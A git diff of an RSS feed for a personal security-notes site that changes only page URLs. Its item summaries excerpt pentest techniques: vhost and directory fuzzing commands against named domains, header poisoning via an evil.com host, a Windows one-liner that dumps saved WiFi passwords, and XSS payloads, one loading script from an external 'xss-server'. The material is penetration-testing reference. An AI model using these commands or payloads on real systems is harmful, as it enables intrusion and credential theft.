       <title>Troubleshoot</title>
-      <link>https://duraki.github.io/notes/public/troubleshoot.html</link>
+      <link>https://duraki.github.io/notes/public/troubleshoot/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://duraki.github.io/notes/public/troubleshoot.html</guid>
+      <guid>https://duraki.github.io/notes/public/troubleshoot/</guid>
       <description>VirtualBox || VMWare When in Kali Linux and doing Security Assessment
  Make sure to set VMWare Kali Box to use NAT (so the VPN connection can be shared from Host, ie. MacOS)  When installing VMWare from JAMF but it doesn&amp;rsquo;t work
  Install VMWare via JAMF Store (to obtain License Key) Backup the license-fusion-120-e3-202001 from the JAMF Store VMWare Installation Application Support Manually downloading the new DMG Removing the JAMF Store VMWare installation Installing the DMG and activating via above license  Guest addition shared folder does not work</description>
@@ -374,19 +374,19 @@ Classical Sleep:
     
     <item>
       <title>Vehicle Graybox Security Testing</title>
-      <link>https://duraki.github.io/notes/public/vehicle-graybox-security-testing.html</link>
+      <link>https://duraki.github.io/notes/public/vehicle-graybox-security-testing/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://duraki.github.io/notes/public/vehicle-graybox-security-testing.html</guid>
+      <guid>https://duraki.github.io/notes/public/vehicle-graybox-security-testing/</guid>
       <description>Security Testing Methods  Brute-force CAN fuzzer for fuzzing application software Interface scanner, layered fuzzing DoS, Replay Messages, Tampering Man in the Middle Read and write into flash dump (extract keys, certificates, sensitive data)  Security Testing in Practice  Send out particular frame IDs using IG Generator Mount network-based attacks like DoS, MiTM, Tampering of Signals Access to debug ports like JTAG to extract + corrupt flash memory/firmware Flash dump - Look into sensitive data  Approach  Reconnaissance Start with market requirements Use customer-provided documents of the system, brochures, user manuals, published material and attacks and vulnerabilities of used components  Understand the Architecture  Analyze high-level architecture and interfaces to understand interaction between different components Use architecture model, system context, interface model, attack pathway, sequence diagram  Identify valued and protectable assets  Identify relevant assets, such is hardware, software, database, etc.</description>
     </item>
     
     <item>
       <title>vhost Enumeration</title>
-      <link>https://duraki.github.io/notes/public/vhost-enumeration.html</link>
+      <link>https://duraki.github.io/notes/public/vhost-enumeration/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://duraki.github.io/notes/public/vhost-enumeration.html</guid>
+      <guid>https://duraki.github.io/notes/public/vhost-enumeration/</guid>
       <description>vhost discovery via ffuf:
 # =&amp;gt; first, find the total char lenght when the vhost does not exists $ curl -s -H &amp;#34;Host: thisdoesntexists.target.ba&amp;#34; http://target.ba | wc -c 246 # =&amp;gt; now use ffuf + filtering options to find valid vhosts $ ffuf -w ~/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H &amp;#34;Host: FUZZ.target.ba&amp;#34; -u http://target.ba -fs 246 # -fc 404,403 vhost discovery via Ruby:
 $ git clone https://github.com/jobertabma/virtual-host-discovery.git $ cd virtual-host-discovery $ ruby scan.rb --ip=51.77.138.18 --host=target.</description>
@@ -394,19 +394,19 @@ $ git clone https://github.com/jobertabma/virtual-host-discovery.git $ cd virtua
     
     <item>
       <title>Web Application Penetration Test Checklist</title>
-      <link>https://duraki.github.io/notes/public/web-application-penetration-test-checklist.html</link>
+      <link>https://duraki.github.io/notes/public/web-application-penetration-test-checklist/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://duraki.github.io/notes/public/web-application-penetration-test-checklist.html</guid>
+      <guid>https://duraki.github.io/notes/public/web-application-penetration-test-checklist/</guid>
       <description>[+] Sql Injection Attack [+] Hibernate Query Language Injection [+] Direct OS Code Injection [+] XML Entity Injection [+] Broken Authentication and Session Management [+] Cross-Site Scripting (XSS) [+] Insecure Direct Object References [+] Security Misconfiguration [+] Sensitive Data Exposure [+] Missing Function Level Access Control [+] Cross-Site Request Forgery (CSRF) [+] Using Components with Known Vulnerabilities [+] Unvalidated Redirects and Forwards [+] Cross Site Scripting Attacks [+] Click Jacking Attacks [+] DNS Cache Poisoning [+] Symlinking – An Insider Attack [+] Cross Site Request Forgery Attacks [+] Remote Code Execution Attacks [+] Remote File inclusion [+] Local file inclusion [+] EverCookie [+] Denial oF Service Attack [+] Cookie Eviction [+] PHPwn [+] NAT Pinning [+] XSHM [+] MitM DNS Rebinding SSL/TLS Wildcards and [+] Quick Proxy Detection [+] Improving HTTPS Side Channel Attacks [+] Side Channel Attacks in SSL [+] Turning XSS into Clickjacking [+] Bypassing CSRF protections with ClickJacking [+] HTTP Parameter Pollution [+] URL Hijacking [+] Stroke Jacking [+] Fooling B64_Encode(Payload) on WAFs And Filters [+] MySQL Stacked Queries with SQL Injection.</description>
     </item>
     
     <item>
       <title>Web Fuzzing Technqiues</title>
-      <link>https://duraki.github.io/notes/public/web-fuzzing-technqiues.html</link>
+      <link>https://duraki.github.io/notes/public/web-fuzzing-technqiues/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://duraki.github.io/notes/public/web-fuzzing-technqiues.html</guid>
+      <guid>https://duraki.github.io/notes/public/web-fuzzing-technqiues/</guid>
       <description>Use SecList seed fuzz Use FuzzDB seed fuzz  Using Gobuster || FFuF Gobuster fuzzing:
 cat ~/SecLists/Discovery/Web-Content/Common-DB-Backups.txt \ ~/SecLists/Discovery/Web-Content/Common-PHP-Filenames.txt \ ~/SecLists/Discovery/Web-Content/PHP.fuzz.txt \ ~/SecLists/Discovery/Web-Content/common.txt \ /tmp/php_files_only.txt | gobuster fuzz -u \ https://www.utic.ba/FUZZ -b 404 -w - -k -t 30 ffuf fuzzing:
 cat ~/SecLists/Discovery/Web-Content/CMS/symphony-267-xslt-cms.txt \ ~/SecLists/Discovery/Web-Content/CMS/symfony-315-demo.txt \ ~/SecLists/Discovery/Web-Content/SVNDigger/symfony.txt \ ~/SecLists/Discovery/Web-Content/SVNDigger/all.txt \ ~/SecLists/Discovery/Web-Content/SVNDigger/all-dirs.txt \ ~/SecLists/Discovery/Web-Content/SVNDigger/context/error.txt \ ~/SecLists/Discovery/Web-Content/SVNDigger/context/index.txt \ ~/SecLists/Discovery/Web-Content/SVNDigger/context/install.txt \ ~/SecLists/Discovery/Web-Content/SVNDigger/context/readme.txt \ ~/SecLists/Discovery/Web-Content/SVNDigger/context/root.txt \ ~/SecLists/Discovery/Web-Content/SVNDigger/context/setup.txt \ ~/SecLists/Discovery/Web-Content/SVNDigger/context/test.txt \ ~/SecLists/Discovery/Web-Content/SVNDigger/context/debug.txt \ ~/SecLists/Discovery/Web-Content/SVNDigger/context/admin.txt \ ~/SecLists/Discovery/Web-Content/SVNDigger/cat/Conf/conf.</description>
@@ -414,10 +414,10 @@ cat ~/SecLists/Discovery/Web-Content/CMS/symphony-267-xslt-cms.txt \ ~/SecLists/
     
     <item>
       <title>Web Penetration Testing Oneliners</title>
-      <link>https://duraki.github.io/notes/public/web-penetration-testing-oneliners.html</link>
+      <link>https://duraki.github.io/notes/public/web-penetration-testing-oneliners/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://duraki.github.io/notes/public/web-penetration-testing-oneliners.html</guid>
+      <guid>https://duraki.github.io/notes/public/web-penetration-testing-oneliners/</guid>
       <description>Also See      Check if vhost is a live on specific DNS or subdomain:
 curl -s -H &amp;#34;Host. $SUBDOMAIN.EXAMPLE.BA&amp;#34; http://example.ba Other techniques described in vhost enumeration
 Redirect URI with a Set-Cookie in GET request:
@@ -427,10 +427,10 @@ Headers: * X-Forwarded-Host: http://evil.com (Password reset poisoning) * X-Forw
     
     <item>
       <title>WinDbg Cheatsheets</title>
-      <link>https://duraki.github.io/notes/public/windbg-cheatsheets.html</link>
+      <link>https://duraki.github.io/notes/public/windbg-cheatsheets/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://duraki.github.io/notes/public/windbg-cheatsheets.html</guid>
+      <guid>https://duraki.github.io/notes/public/windbg-cheatsheets/</guid>
       <description>Just personal things related to my frustration with WinDbg (:
 The symbol search path tells WinDbg where to look for symbol (PDB) files. The debugger needs symbol files to obtain information about code modules (function names, variable names, and the like).
 .sympath srv* Symbol search path is: srv* Expanded Symbol search path is: cache*;SRV To see the symbols for the Notepad.exe module, enter this command:
@@ -439,10 +439,10 @@ x notepad:! Note, if ytou don7t see any output, enter .</description>
     
     <item>
       <title>Windows Notes</title>
-      <link>https://duraki.github.io/notes/public/windows-notes.html</link>
+      <link>https://duraki.github.io/notes/public/windows-notes/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://duraki.github.io/notes/public/windows-notes.html</guid>
+      <guid>https://duraki.github.io/notes/public/windows-notes/</guid>
       <description>When setting up Reverse Engineering workstation, use retoolkit for a start kit.
  Extract WiFi cleartextr password
 cls &amp;amp; echo. &amp;amp; for /f &amp;#34;tokens=4 delims=: &amp;#34; %a in (&amp;#39;netsh wlan show profiles ^| find &amp;#34;Profile &amp;#34;&amp;#39;) do @echo off &amp;gt; nul &amp;amp; (netsh wlan show profiles name=%a key=clear | findstr &amp;#34;SSID Cipher Content&amp;#34; | find /v &amp;#34;Number&amp;#34; &amp;amp; echo.) &amp;amp; @echo on Active Directory
@@ -451,10 +451,10 @@ Access Active Directory Domain Admin via Linux:</description>
     
     <item>
       <title>XSS Payloads</title>
-      <link>https://duraki.github.io/notes/public/xss-payloads.html</link>
+      <link>https://duraki.github.io/notes/public/xss-payloads/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://duraki.github.io/notes/public/xss-payloads.html</guid>
+      <guid>https://duraki.github.io/notes/public/xss-payloads/</guid>
       <description>JSON: {&amp;#34;email&amp;#34;:&amp;#34;some@email.com&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;alert(document.domain)//&amp;#34;} The value of REQUEST_URI was not correctly sanitizing user input, in this case, double-quotes. However, due to URL encoding, this was only exploitable in IE. https://inventory.upserve.com/login/?&amp;#39;&amp;#34;--&amp;gt;&amp;lt;script&amp;gt;confirm(document.cookie)&amp;lt;/script&amp;gt; In URL PATH: &amp;#34;accesskey=&amp;#39;x&amp;#39; onclick=&amp;#39;confirm`1`&amp;#39; // Hi&amp;#39;&amp;amp;gt;&amp;#34;&amp;lt;script src=&amp;#34;//xss-server&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;x=&amp;#34;{9*9}\r\n%0a%09%0d&amp;lt;svg\onload=confirm(1)&amp;gt; </description>
     </item>
     
